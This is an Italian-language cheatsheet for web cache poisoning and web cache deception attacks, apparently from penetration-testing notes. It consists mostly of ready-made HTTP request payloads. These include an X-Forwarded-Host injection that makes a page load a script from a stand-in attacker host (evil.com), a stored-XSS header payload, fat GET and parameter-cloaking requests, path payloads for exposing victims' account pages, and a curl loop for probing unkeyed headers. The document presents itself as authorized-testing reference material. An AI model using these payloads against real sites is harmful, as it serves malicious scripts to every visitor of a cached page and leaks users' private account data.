# 💾 Web Cache Poisoning Cheatsheet

```
   ██████╗ █████╗  ██████╗██╗  ██╗███████╗    ██████╗  ██████╗ ██╗███████╗ ██████╗ ███╗   ██╗██╗███╗   ██╗ ██████╗ 
  ██╔════╝██╔══██╗██╔════╝██║  ██║██╔════╝    ██╔══██╗██╔═══██╗██║██╔════╝██╔═══██╗████╗  ██║██║████╗  ██║██╔════╝ 
  ██║     ███████║██║     ███████║█████╗      ██████╔╝██║   ██║██║███████╗██║   ██║██╔██╗ ██║██║██╔██╗ ██║██║  ███╗
  ██║     ██╔══██║██║     ██╔══██║██╔══╝      ██╔═══╝ ██║   ██║██║╚════██║██║   ██║██║╚██╗██║██║██║╚██╗██║██║   ██║
  ╚██████╗██║  ██║╚██████╗██║  ██║███████╗    ██║     ╚██████╔╝██║███████║╚██████╔╝██║ ╚████║██║██║ ╚████║╚██████╔╝
   ╚═════╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝    ╚═╝      ╚═════╝ ╚═╝╚══════╝ ╚═════╝ ╚═╝  ╚═══╝╚═╝╚═╝  ╚═══╝ ╚═════╝ 
```

---

## 🎯 Cos'è il Cache Poisoning

Il **Web Cache Poisoning** sfrutta il comportamento della cache per memorizzare risposte malevole, servendole ad altri utenti.

### Impatto
- 🔴 **Mass XSS** - XSS memorizzato per tutti gli utenti
- 🔴 **Defacement** - Cache di contenuti malevoli
- 🔴 **DoS** - Cache di risposte di errore
- 🔴 **Attacchi di redirect** - Reindirizzamento degli utenti

---

## 🔍 Comprendere la Cache

### Chiavi di Cache
```
# Tipicamente la cache usa:
URL + Header dell'Host

# NON inclusi (non chiave):
X-Forwarded-Host
X-Forwarded-Scheme
X-Original-URL
X-Rewrite-URL
Custom headers
```

### Rilevare la Cache
```bash
# Cerca header della cache
curl -I https://target.com

# Indicatori di cache:
X-Cache: HIT
X-Cache-Hits: 5
CF-Cache-Status: HIT
Age: 300
Cache-Control: public, max-age=3600
```

---

## 💉 Injection di Header non chiave

### X-Forwarded-Host
```http
GET / HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com

# Se la risposta riflette evil.com:
<script src="//evil.com/malicious.js">
```

### X-Forwarded-Scheme
```http
GET / HTTP/1.1
Host: target.com
X-Forwarded-Scheme: nothttps

# Può causare una redirect o confusione di protocollo
Location: http://target.com/
```

### X-Host
```http
GET / HTTP/1.1
Host: target.com
X-Host: evil.com

# Verifica la riflessione
```

### X-Original-URL / X-Rewrite-URL
```http
GET / HTTP/1.1
Host: target.com
X-Original-URL: /admin

# Bypass delle restrizioni sul path
```

---

## 🔥 Tecniche di Attacco

### Cache Poisoning XSS di base
```http
# 1. Trova input non chiave che viene riflesso nella risposta
GET /page HTTP/1.1
Host: target.com
X-Forwarded-Host: attacker.com"><script>alert(1)</script>

# 2. La risposta viene memorizzata in cache con XSS
# 3. Tutti gli utenti ricevono XSS dalla cache
```

### Cache Poisoning tramite Path
```http
# Richiesta con path di origine diverso
GET /page;evil HTTP/1.1
Host: target.com

# Può essere memorizzata con chiave diversa dal previsto
```

### Fat GET Requests
```http
GET / HTTP/1.1
Host: target.com
Content-Length: 25

callback=alert(document.domain)

# Il body può influenzare la risposta ma non la chiave di cache
```

### Parameter Cloaking
```http
# Ruby on Rails
GET /page?param=value;callback=evil HTTP/1.1

# Parsing diverso tra cache e applicazione
```

---

## 🛠️ Web Cache Deception

### Diverso dal Poisoning!
```
# Poisoning: Il payload dell'attaccante viene memorizzato per le vittime
# Deception: I dati della vittima vengono memorizzati per l'attaccante

# Passi Web Cache Deception:
1. Convinci la vittima a visitare: /account/settings.css
2. Il server restituisce /account/settings (ignora .css)
3. La cache lo memorizza come risorsa pubblica
4. L'attaccante recupera /account/settings.css dalla cache
5. Ottiene i dati sensibili della vittima
```

### Payloads
```
/account/settings/x.css
/account/settings/..%2fx.css
/account/settings%3b.css
/account/settings.css
/account/settings/nonexistent.js
```

---

## 📊 Tecnica Cache Buster

### Per i test
```http
# Aggiungi cache buster per non influenzare altri utenti
GET /page?cb=random123 HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com

# Ogni test ottiene una chiave di cache unica
```

---

## 🛠️ Tool

### Param Miner (Estensione Burp)
```
1. Installa Param Miner dal BApp Store
2. Clic destro sulla richiesta → Extensions → Param Miner
3. "Guess headers"
4. Cerca header non chiave
```

### Test Manuale
```bash
# Testa gli header
for header in "X-Forwarded-Host" "X-Host" "X-Forwarded-Scheme" "X-Original-URL"; do
    echo "Testing: $header"
    curl -H "$header: evil.com" -I https://target.com
done
```

---

## 📋 Header non chiave comuni

```
X-Forwarded-Host
X-Forwarded-Scheme
X-Forwarded-Proto
X-Host
X-Original-URL
X-Rewrite-URL
X-Forwarded-Server
X-HTTP-Method-Override
X-Forwarded-For
True-Client-IP
```

---

## 📚 Risorse

- [PortSwigger Web Cache Poisoning](https://portswigger.net/web-security/web-cache-poisoning)
- [PortSwigger Research](https://portswigger.net/research/practical-web-cache-poisoning)
- [Web Cache Deception](https://www.blackhat.com/docs/us-17/wednesday/us-17-Gil-Web-Cache-Deception-Attack.pdf)

---

<p align="center">
  <b>💾 Avvelena la Cache!</b><br>
  <i>Solo per test autorizzati!</i>
</p>
